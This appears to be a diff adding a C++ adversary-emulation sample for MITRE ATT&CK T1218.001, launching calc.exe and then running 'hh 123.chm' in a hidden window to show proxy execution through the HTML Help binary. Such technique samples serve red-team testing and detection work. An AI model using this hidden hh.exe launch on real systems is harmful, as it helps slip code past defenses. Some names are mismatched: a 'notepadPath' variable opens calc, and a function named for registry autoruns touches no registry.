@@ -1,0 +1,42 @@
+---
+title: ".001.Compiled HTML File"
+folder: "07. Defense Evasion/T1218 System Binary Proxy Execution "
+---
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+
+void OpenCalc() {
+
+    wchar_t currentDirectory[MAX_PATH];
+    GetCurrentDirectoryW(MAX_PATH, currentDirectory);
+    std::wstring notepadPath = std::wstring(currentDirectory) + L"\\calc.exe";
+
+
+    if (ShellExecuteW(NULL, L"open", notepadPath.c_str(), NULL, NULL, SW_SHOWNORMAL) <= (HINSTANCE)32) {}
+}
+void AutorunRegistryBackground4() {
+
+    const char* command = "hh 123.chm";
+    STARTUPINFOA si = {};
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi;
+
+
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+}
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    OpenCalc();
+    AutorunRegistryBackground4();
+    return 0;
+}
